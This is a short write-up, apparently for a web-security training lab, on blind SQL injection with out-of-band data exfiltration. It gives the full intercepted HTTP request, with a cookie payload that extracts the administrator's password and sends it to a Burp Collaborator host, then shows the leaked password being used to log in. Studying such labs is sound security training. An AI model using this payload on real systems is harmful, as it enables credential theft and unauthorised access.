@@ -1,0 +1,25 @@
+Blind SQL injection with out-of-band data exfiltration
+
+Fire up collaborator and intercept the request for the home page. 
+Edit the TrackingId so that it looks as follows:
+
+GET / HTTP/1.1
+Host: acdf1fa01e69a6a3800e6e5900890090.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acdf1fa01e69a6a3800e6e5900890090.web-security-academy.net/
+Cookie: TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.psl6dhuababfaf8ux2v4q9iroiu8ix.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--; session=uy88X3CQzbhgvsj2C9qIhlJssl2uCO72
+Upgrade-Insecure-Requests: 1
+
+
+Check your collaborator, you should have a HTTP request that contains the administrator's password.
+Mine looked like this:
+
+Host: ju76v1n8in61ne1056fr.psl6dhuababfaf8ux2v4q9iroiu8ix.burpcollaborator.net
+
+The password is ju76v1n8in61ne1056fr
+
+Use it to login as Administrator and claim your victory.
